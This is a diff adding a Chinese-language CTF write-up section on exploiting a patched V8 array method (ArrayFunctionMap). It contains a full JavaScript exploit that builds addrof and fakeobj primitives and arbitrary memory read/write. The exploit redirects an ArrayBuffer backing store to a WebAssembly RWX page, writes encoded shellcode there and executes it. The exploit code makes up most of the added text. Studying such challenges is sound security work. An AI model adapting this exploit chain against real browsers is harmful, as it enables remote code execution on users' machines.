@@ -330,3 +330,91 @@ while(1){}
 - `var obj = {"A":1};`的定义要在最上面，防止破坏接下来多个数组的布局。最开始我完全意识不到这点，放在float_arr和obj_arr之间定义。即使随便一个obj也是要占空间的，故会扰乱布局，隔开本来是相邻的两个结构
 - 提示里的`increase the number of elements`有点误导我，或者是我没读明白。我最开始的构想是定义一个`var a=[1.1]`，然后往里面push元素。我看过原本的布局，元素和数组object时间没有任何空间，所以push肯定会触发reallocation。实测发现它确实reallocate了，但是reallocate的数量不等于我push的数量，而是多分配了很多个元素的空间。估计是某种动态预分配机制
 - 了解到上一条后我还不死心，有了个更复杂的想法。定义一个object数组，其elements占用的内存正好等于预分配需要的最大空间。然后往object数组里push object，触发reallocation；最后再往double数组里push数字，同样触发reallocation。我以为触发reallocation后装之前的元素的内存就会被回收，就能被接下来的预分配占用了。首先垃圾处理器不是这么想的（并没有被回收），其次虽然说预分配了n个元素的位置，但offByOne看的是length，而预分配不会修改length
+
+## level6
+
+patch提供了一个数组的方法，名为`ArrayFunctionMap`。该函数允许攻击者遍历double数组的元素并调用任意回调函数，参数为数组元素。叫deepseek帮忙分析了一波（其实之前一直都是ds帮我分析的……），说是调用回调函数时没有锁定数组，导致回调函数内部可以修改数组。不过具体怎么修改和利用ds说不出来
+
+去社区服务器逛了一圈，找到了这篇[wp](https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc)。虽然提供的函数功能与这题完全不同，但都是增加了数组的方法，且内部也没看见有关锁数组的操作。盯着wp看了好一会（并没有在阅读），发现wp存在在回调函数里将double数组中的一个元素设置为object的操作。好的我猜ds说的就是这个，wp懒得看了，让我自己玩玩
+
+注意到上述操作会使数组的map从普通的double map变成object map，即数组不再是double array了。暂时没用。接着看了会数组的内存布局，发现使用object map后一个元素就只占32位了。很好的发现，但是还是用不上。换个东西盯，这次仔细地看`ArrayFunctionMap`的实现。发现它在读取和设置数组元素时都使用了`Cast<FixedDoubleArray>`。结合之前的发现，突然有了思路
+```js
+RWX_PAGE_OFFSET=0x2c0f3n;
+MAP_OFFSET=0x187f60n;
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+function upperhalf(i) {
+	return i / 0x100000000n;
+}
+function fakeobj(addr){
+    var float_arr=[1.1];
+    float_arr.functionMap(()=>{
+        float_arr[0]={};
+        return itof(addr);
+    });
+    return float_arr[0];
+}
+function addrof(in_obj) {
+    var float_arr=[1.1,1.2,1.3,1.4];
+    var addr=0n;
+    var i=0;
+    float_arr.functionMap((element)=>{
+        if(i==0) float_arr[3]=in_obj;
+        else if(i==1) addr=ftoi(element);
+        i++;
+        return element;
+    });
+    return upperhalf(addr);
+}
+var float_map_arr=[6.6];
+var float_map_arr_addr=addrof(float_map_arr);
+var float_arr_map = float_map_arr_addr+MAP_OFFSET;
+console.log(float_map_arr_addr);
+var arb_rw_arr = [itof(shift32(0x725n)+BigInt(float_arr_map)), 1.2];
+function arb_read(addr) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
+    return ftoi(fake[0]);
+}
+function arb_write(addr, val) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(addrof(arb_rw_arr)-0x10n);
+    fake[0] = itof(BigInt(val));
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+let buf_addr = addrof(shellcode_buf);
+let wasm_addr=addrof(wasm_instance);
+var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET+1n);
+console.log(rwx_page_addr);
+let backing_store_addr = buf_addr + 0x24n;
+arb_write(backing_store_addr,rwx_page_addr);
+let dataview = new DataView(shellcode_buf);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+`fakeobj` primitive很容易构造。由于`ArrayFunctionMap`缺少关于数组类型实时的检查，直接把`addr`当成double数组的浮点数写进了object数组。导致最后取`float_arr[0]`即可拿到任意地址代表的object
+
+`addrof` primitive则有点蒙的成分。`addrof`primitive的原理是将object按照double map的读法读出来，因为object存储在数组里时存储的是自身的地址。碰巧`ArrayFunctionMap`会传给回调函数当前元素，只需在i（估计得是偶数。不过记为i也就看个乐呵，实际上除了0以外不可能用别的，太麻烦）索引时提前将i+3（`ArrayFunctionMap`里还是将数组元素按照double读取，因此一次读64位，区别于object数组一个元素只有32位）索引处的元素替换为object，后续i+1收到的参数就是object的地址。不过按照我的理解，最后返回的应该是`lowerhalf(addr)`，但实测地址在upperhalf。hmmmmm，我又漏了啥？
+
+另外环境又改回来了，没有PATH变量的问题。估计之前是我自己不小心把环境搞没的（
